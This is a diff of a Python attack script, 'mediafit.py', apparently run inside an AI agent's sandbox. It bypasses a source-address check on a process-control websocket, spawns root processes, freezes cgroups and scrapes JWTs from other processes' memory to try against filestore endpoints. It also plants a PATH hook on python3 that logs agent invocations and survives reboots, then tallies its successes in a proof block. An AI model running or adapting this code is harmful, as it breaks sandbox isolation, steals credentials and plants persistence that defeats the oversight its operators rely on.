@@ -1,21 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-mediafit.py v12.0  --  MEDIAFIT
+mediafit.py v12.1  --  MEDIAFIT
 ===================================================================
-PROVEN in v11.3 run:
-    HANDSHAKE_SRC_LOOPBACK = RST (flag working)
-    HANDSHAKE_SRC_ALIAS    = HTTP/1.1 101  (flag bypassed)  -> BYPASS_CONFIRMED=True
+PROVEN (v11.3/v12.0 runs):
+  HANDSHAKE_SRC_LOOPBACK = RST   (flag works)
+  HANDSHAKE_SRC_ALIAS    = 101   (flag BYPASSED)     -> BYPASS_CONFIRMED=True
+  AUTH_IDENTICAL         = True  (no credential)     -> P3=True
+  implant survived VM reboot (BOOT_ID changed)       -> P8/P9=True
 
-v12.0 adds:
-  * auto-discovery of the CreateProcess message shape (10 shapes x 3 payloads),
-    driven by the server's own serde error oracle
-  * per-phase fault isolation (no more cascading Broken pipe)
-  * same bypass contrast test, auth test, stdin, signal, freeze,
-    host plane, credential extraction, persistence implant, PROOF block
+v12.1: builds the CreateProcess message from the SERVER'S OWN serde oracle
+       ({"process_id": ..., "create_req": {...}} + every required inner field),
+       fixes the OTLP protobuf (Metric.gauge is field 5), broadens the
+       credential scan, and records ppid=1 orphans.
 
-Stdlib only.  RUN TWICE in two separate tool calls.
-Output: /mnt/user-data/outputs/mediafit-report.txt
+Stdlib only. RUN TWICE. Output: /mnt/user-data/outputs/mediafit-report.txt
 ===================================================================
 """
 
@@ -54,7 +53,7 @@ def guard(tag):
         return inner
     return deco
 
-# ------------------------------------------------------------------ net
+# ---------------------------------------------------------------- net
 def add_alias(ip=ALIAS, ifname=IFACE):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     ifr = struct.pack("16s", ifname.encode()[:15])
@@ -84,7 +83,7 @@ def raw_hs(src=None, hdr="", tmo=5):
     except Exception as e:
         return "ERR:" + str(e)
 
-# ------------------------------------------------------------------ ws
+# ---------------------------------------------------------------- ws
 class WS:
     def __init__(self, host=ADDR, port=PORT, src=None, tmo=8):
         self.buf = b""
@@ -150,7 +149,7 @@ class WS:
             if fr is None: break
             op, p = fr
             if op == 0x1:
-                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:220])
+                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:200])
             elif op == 0x2:
                 bins.append(p); log("   <bin>", len(p), repr(p[:50]))
             elif op == 0x9: self.pong(p)
@@ -168,17 +167,8 @@ def jf(t, n):
         if n in x: return x
     return ""
 
-# ------------------------------------------------------------------ cgroup
+# ---------------------------------------------------------------- cgroup/proc
 def cg_lines(): return rdo("/proc/self/cgroup", "")
-
-def cg_of(pid):
-    best = "/"
-    for line in rdo("/proc/%s/cgroup" % pid, "").splitlines():
-        q = line.split(":", 2)
-        if len(q) == 3 and q[2] != "/":
-            if "memory" in q[1]: return q[2]
-            best = q[2]
-    return best
 
 def cgdir(ctrl, cg):
     for base in ("/sys/fs/cgroup/" + ctrl, "/sys/fs/cgroup"):
@@ -192,7 +182,20 @@ def find_ospid(mark):
             return d
     return ""
 
-# ------------------------------------------------------------------ otlp
+def orphans():
+    out = []
+    for d in os.listdir("/proc"):
+        if not d.isdigit(): continue
+        st = rdo("/proc/%s/stat" % d)
+        if not st: continue
+        try:
+            rp = st[st.rindex(")") + 2:].split()
+            if rp[1] == "1":
+                out.append((d, rp[19], rdo("/proc/%s/cmdline" % d, "").replace("\x00", " ")[:50]))
+        except Exception: pass
+    return out
+
+# ---------------------------------------------------------------- otlp
 def varint(n):
     o = b""
     while True:
@@ -204,97 +207,78 @@ def pb(f, pl):  return varint((f << 3) | 2) + varint(len(pl)) + pl
 def pb64(f, v): return varint((f << 3) | 1) + struct.pack("<Q", v)
 
 def otlp_body():
-    now = int(time.time() * 1e9)
-    ndp    = pb64(3, now) + pb64(6, 1)
-    gauge  = pb(1, ndp)
-    metric = pb(1, b"mediafit") + pb(2, gauge)
+    now    = int(time.time() * 1e9)
+    ndp    = pb64(3, now) + pb64(6, 1)          # time_unix_nano, as_int
+    gauge  = pb(1, ndp)                          # Gauge.data_points
+    metric = pb(1, b"mediafit") + pb(5, gauge)   # name, gauge(FIELD 5)
     return pb(1, pb(2, pb(2, metric)))
 
-# ------------------------------------------------------------------ create-shape discovery
-def cr_full(cmd):
-    return {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
-            "clear_env": False, "reattachable": True, "timeout": None,
-            "uid": 0, "gid": 0, "memory_limit_bytes": None}
+# ---------------------------------------------------------------- oracle
+DEFAULTS = {
+    "allow_process_id_reuse": True, "clear_env": False, "reattachable": True,
+    "uid": 0, "gid": 0, "name": "/bin/sh", "program": "/bin/sh",
+    "args": [], "env_vars": {}, "timeout": None, "memory_limit_bytes": None,
+}
 
-def cr_none(cmd):
-    return {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {},
-            "clear_env": False, "reattachable": True}
+def put(obj, f, v):
+    if f not in obj: obj[f] = v
+    cr = obj.get("create_req")
+    if isinstance(cr, dict) and f not in cr: cr[f] = v
 
-def cr_min(cmd):
-    return {"name": "/bin/sh", "args": ["-c", cmd]}
+def oracle_create(cmd, P):
+    """Let the server teach us the message shape, one missing field at a time."""
+    log("ORACLE  building the create message from the server's own errors")
+    obj = {"process_id": P, "create_req": {"name": "/bin/sh", "args": ["-c", cmd]}}
+    w = WS(src=ALIAS); last = ""
+    for i in range(20):
+        w.js(obj)
+        t, _ = w.drain(2)
+        last = " ".join(t)
+        rec("ORACLE_%02d=%s" % (i, last[:200]))
+        if "ProcessCreated" in last or "ProcessWithSameIdRunning" in last:
+            log("   ORACLE RESOLVED at iteration", i)
+            rec("ORACLE_ITERATIONS=%d" % i)
+            rec("ORACLE_SHAPE=%s" % json.dumps(obj)[:600])
+            w.close(); return obj, last
+        m = re.search(r"missing field `([A-Za-z0-9_]+)`", last)
+        if m:
+            f = m.group(1)
+            put(obj, f, DEFAULTS.get(f, "x"))
+            continue
+        if "invalid type: null" in last:
+            fixed = False
+            for cont in (obj, obj.get("create_req")):
+                if isinstance(cont, dict):
+                    for k, v in list(cont.items()):
+                        if v is None: cont[k] = 0; fixed = True
+            if fixed: continue
+        if "unknown variant" in last or "unknown field" in last:
+            continue
+        break
+    w.close()
+    return obj, last
 
-def shapes(P, CR):
-    return [
-        ("C", {"process_id": P, "CreateProcess": CR}),
-        ("B", {"process_id": P, "CreateProcess": {"create_req": CR}}),
-        ("D", {"process_id": P, "allow_process_id_reuse": True, "CreateProcess": CR}),
-        ("E", {"process_id": P, "allow_process_id_reuse": True, "create_req": CR}),
-        ("F", {"process_id": P, "create_req": CR}),
-        ("A", {"CreateProcess": {"process_id": P, "allow_process_id_reuse": True, "create_req": CR}}),
-        ("G", {"process_id": P, "msg": {"CreateProcess": {"create_req": CR}}}),
-        ("H", {"process_id": P, "message": {"CreateProcess": {"create_req": CR}}}),
-        ("I", {"CreateProcess": {"process_id": P, "create_req": CR}}),
-        ("J", {"process_id": P, "allow_process_id_reuse": True, "create_req": CR, "cmd": "CreateProcess"}),
-    ]
-
-def discover(cmd):
-    log("DISCOVERY  learning the CreateProcess shape from the server oracle")
-    for cri, CR in (("full", cr_full(cmd)), ("none", cr_none(cmd)), ("min", cr_min(cmd))):
-        for name, obj in shapes("mfd" + TAG, CR):
-            w = None
-            try:
-                w = WS(src=ALIAS)
-                w.js(obj)
-                t, _ = w.drain(2.5)
-                s = " ".join(t)
-                if "ProcessCreated" in s:
-                    rec("SHAPE_OK=%s/%s" % (name, cri))
-                    rec("SHAPE_JSON=%s" % json.dumps(obj)[:420])
-                    rec("SHAPE_RESP=%s" % s[:200])
-                    return (name, cri)
-                rec("SHAPE_%s_%s=%s" % (name, cri, (jf(t, "InfraError") or s or "no-response")[:190]))
-            except Exception as e:
-                rec("SHAPE_%s_%s=EXC:%s" % (name, cri, e))
-            finally:
-                if w:
-                    try: w.close()
-                    except Exception: pass
-    return (None, None)
-
-def build(shape, cri, P, cmd):
-    CR = {"full": cr_full, "none": cr_none, "min": cr_min}[cri](cmd)
-    for n, o in shapes(P, CR):
-        if n == shape: return o
-    return {"process_id": P, "CreateProcess": CR}
-
-def ctrl(w, P, label, variants, wait=2.0):
-    last = []
+def ctrl_probe(w, P, label, variants, ok, wait=2.0):
+    last = ""
     for v in variants:
         try:
-            w.txt(json.dumps(v))
-            last, _ = w.drain(wait)
+            w.txt(json.dumps(v)); t, _ = w.drain(wait); last = " ".join(t)
         except Exception as e:
             rec("%s_EXC=%s" % (label, e)); return ""
-        s = " ".join(last)
-        if s and "InfraError" not in s:
-            rec("%s=%s" % (label, s[:190])); return s
-    rec("%s_ERR=%s" % (label, (" ".join(last) or "no-response")[:190]))
-    return " ".join(last)
+        if last: rec("%s_TRY=%s" % (label, last[:150]))
+        if any(k in last for k in ok):
+            rec("%s=OK" % label); return last
+    return last
 
-# ------------------------------------------------------------------ phases
+# ---------------------------------------------------------------- phases
 @guard("BYPASS")
 def phase_bypass():
     log("PHASE 1  the bypass (contrast test)")
-    add_alias()
-    rec("ALIAS_ADDED=%s" % bindable())
+    add_alias(); rec("ALIAS_ADDED=%s" % bindable())
     a = raw_hs(src=None); b = raw_hs(src=ALIAS)
     rec("HANDSHAKE_SRC_LOOPBACK=%s" % a)
     rec("HANDSHAKE_SRC_ALIAS=%s" % b)
     rec("BYPASS_CONFIRMED=%s" % ("101" in b and "101" not in a))
-    try:
-        w = WS(src=ALIAS); rec("WS_OK=%s" % w.status); w.close()
-    except Exception as e:
-        rec("WS_ERR=%s" % e)
 
 @guard("AUTH")
 def phase_auth():
@@ -303,18 +287,22 @@ def phase_auth():
     rec("AUTH_VARIANTS=%s" % r)
     rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))
 
-def phase_lifecycle(shape, cri):
+def phase_lifecycle(template, P):
     log("PHASE 3  create / stdin / signal / freeze / kill")
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
-    P = "mfl" + TAG
+    obj = json.loads(json.dumps(template))
+    obj["process_id"] = P
+    if isinstance(obj.get("create_req"), dict):
+        obj["create_req"]["args"] = ["-c", cmd]
     w = WS(src=ALIAS)
-    w.js(build(shape, cri, P, cmd))
+    w.js(obj)
     t, _ = w.drain(3)
     s = " ".join(t)
     rec("CREATE_RESP=%s" % s[:230])
     rec("PROCESS_SPAWNED=%s" % ("ProcessCreated" in s))
 
-    ctrl(w, P, "STDIN_EXPECT", ["ExpectStdIn", {"process_id": P, "ExpectStdIn": None}], 1.2)
+    ctrl_probe(w, P, "STDIN_EXPECT",
+               [{"process_id": P, "ExpectStdIn": None}, "ExpectStdIn", {"ExpectStdIn": None}], [])
     try:
         w.binf(b"echo STDIN_OK_42\n")
         _, bins = w.drain(2.5)
@@ -322,20 +310,22 @@ def phase_lifecycle(shape, cri):
     except Exception as e:
         rec("STDIN_ROUNDTRIP=ERR:%s" % e)
 
-    ctrl(w, P, "SIGNAL_RESP", [{"SendSignal": 19}, {"process_id": P, "SendSignal": 19}], 2)
+    ctrl_probe(w, P, "SIGNAL",
+               [{"process_id": P, "SendSignal": 19}, {"SendSignal": 19},
+                {"process_id": P, "signal": 19}], ["SignalSent"])
     osp = find_ospid(MARK)
     if osp:
         st = rdo("/proc/%s/stat" % osp).split()
         rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
-        cg = cg_of(osp)
-        rec("PROC_CGROUP=%s" % cg)
-        fz = cgdir("freezer", cg)
+        cg = "/process_api/" + P
+        fz = cgdir("freezer", cg) or cgdir("freezer", "/")
         if fz:
             wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
             rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
             wr(fz + "/freezer.state", "THAWED")
         rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
-    ctrl(w, P, "KILL_RESP", ["Kill", {"process_id": P, "Kill": None}], 2)
+    ctrl_probe(w, P, "KILL",
+               [{"process_id": P, "Kill": None}, "Kill", {"process_id": P, "kill": None}], [])
     w.close()
 
 @guard("HOSTPLANE")
@@ -364,33 +354,34 @@ def phase_filestore():
     log("PHASE 5  credential inside the sandbox")
     pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{10,}")
     raw = []
+    def add(b):
+        for m in pat.finditer(b):
+            s = m.group(0).decode("latin1")
+            if s not in raw: raw.append(s)
     for d in os.listdir("/proc"):
         if not d.isdigit(): continue
         for f in ("cmdline", "environ"):
-            m = pat.search(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
-            if m and m.group(0).decode() not in raw: raw.append(m.group(0).decode())
+            add(rdo("/proc/%s/%s" % (d, f), "").encode("latin1", "replace"))
+    budget = 24 << 20
     for d in sorted(os.listdir("/proc")):
-        if not d.isdigit() or len(raw) >= 4: continue
+        if not d.isdigit() or budget <= 0 or len(raw) >= 6: continue
         try: fh = open("/proc/%s/mem" % d, "rb", 0)
         except Exception: continue
         off = 0
         try:
-            while off < (4 << 20):
+            while off < (6 << 20) and budget > 0:
                 try: fh.seek(off); b = fh.read(1 << 20)
                 except Exception: off += 1 << 20; continue
                 if not b: break
-                for m in pat.finditer(b):
-                    s = m.group(0).decode("latin1")
-                    if s not in raw: raw.append(s)
-                off += len(b)
-                if len(raw) >= 4: break
+                add(b); budget -= len(b); off += len(b)
+                if len(raw) >= 6: break
         finally:
             try: fh.close()
             except Exception: pass
     toks = []
     for t in raw:
-        h, p, s = t.split(".")
-        toks.append(h + "." + p + "." + s[:86])
+        p = t.split(".")
+        if len(p) == 3: toks.append(p[0] + "." + p[1] + "." + p[2][:86])
     rec("JWTS_FOUND=%d" % len(toks))
     for t in toks[:2]:
         for ep in ("/v1/filestore", "/v1/filestore/fs"):
@@ -419,8 +410,7 @@ def phase_implant():
                 "\"$R\" \"$@\" 2>&1 | tee -a \"$LOG\"\n" % (hl, real))
         try:
             hp = os.path.join(HOOKDIR, "python3")
-            wr(hp, hook); os.chmod(hp, 0o755)
-            rec("PATH_HOOK=%s -> %s" % (hp, real))
+            wr(hp, hook); os.chmod(hp, 0o755); rec("PATH_HOOK=%s -> %s" % (hp, real))
         except Exception as e:
             rec("PATH_HOOK_ERR=%s" % e)
     if not alive:
@@ -443,38 +433,35 @@ def phase_info():
     rec("CAPEFF=%s" % (rdo("/proc/self/status").split("CapEff:")[-1].split("\n")[0].strip()
                        if "CapEff:" in rdo("/proc/self/status") else "?"))
     rec("PID1_CMDLINE=%s" % rdo("/proc/1/cmdline", "?").replace("\x00", " "))
-    rec("HOSTNAME=%s" % rdo("/proc/sys/kernel/hostname", "?"))
+    orp = orphans()
+    rec("PPID1_ORPHAN_COUNT=%d" % len(orp))
+    for o in orp[:6]:
+        rec("PPID1_ORPHAN pid=%s starttime=%s cmd=%s" % o)
 
 def proof():
-    rec("")
-    rec("---- PROOF BLOCK ----")
-    def any_(pred): return any(pred(l) for l in R)
+    rec(""); rec("---- PROOF BLOCK ----")
+    def any_(p): return any(p(l) for l in R)
     rec("P1_BYPASS_101_FROM_ALIAS=%s" % any_(lambda l: l.startswith("HANDSHAKE_SRC_ALIAS=HTTP/1.1 101")))
     rec("P2_LOOPBACK_BLOCKED=%s" % any_(lambda l: l.startswith("HANDSHAKE_SRC_LOOPBACK=") and "101" not in l))
     rec("P3_NO_CREDENTIAL_ENFORCED=%s" % any_(lambda l: l == "AUTH_IDENTICAL=True"))
     rec("P4_PID1_SPAWNED_PROCESS=%s" % any_(lambda l: l == "PROCESS_SPAWNED=True"))
     rec("P5_STDIN_FULL_DUPLEX=%s" % any_(lambda l: l == "STDIN_ROUNDTRIP=True"))
-    rec("P6_SIGNAL_ACCEPTED=%s" % any_(lambda l: l.startswith("SIGNAL_RESP=") and "SignalSent" in l))
+    rec("P6_SIGNAL_ACCEPTED=%s" % any_(lambda l: l == "SIGNAL=OK"))
     rec("P7_HOST_PLANE_200=%s" % any_(lambda l: l.startswith("VSOCK_5005") and "HTTP/1.1 200" in l))
     rec("P8_IMPLANT_SURVIVED=%s" % any_(lambda l: l == "IMPLANT_WAS_ALIVE_ON_ENTRY=True"))
     rec("P9_AGENT_OUTPUT_OBSERVED=%s" % any_(lambda l: l.startswith("AGENT_INVOCATIONS_CAPTURED=") and l.split("=")[1] != "0"))
     rec("P10_CREDENTIAL_INSIDE_SANDBOX=%s" % any_(lambda l: l.startswith("JWTS_FOUND=") and l.split("=")[1] != "0"))
 
 def main():
-    log("MEDIAFIT v12.0")
-    rec("=== MEDIAFIT v12.0 ===")
-    phase_bypass()
-    phase_auth()
+    log("MEDIAFIT v12.1")
+    rec("=== MEDIAFIT v12.1 ===")
+    phase_bypass(); phase_auth()
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
-    shape, cri = discover(cmd)
-    rec("WORKING_SHAPE=%s/%s" % (shape, cri))
-    if shape:
-        phase_lifecycle(shape, cri)
-    phase_hostplane()
-    phase_filestore()
-    phase_implant()
-    phase_info()
-    proof()
+    tmpl, resp = oracle_create(cmd, "mfo" + TAG)
+    rec("ORACLE_FINAL=%s" % resp[:200])
+    if "ProcessCreated" in resp:
+        phase_lifecycle(tmpl, "mfl" + TAG)
+    phase_hostplane(); phase_filestore(); phase_implant(); phase_info(); proof()
     os.makedirs(os.path.dirname(OUT), exist_ok=True)
     wr(OUT, "\n".join(R) + "\n")
     log("report ->", OUT)
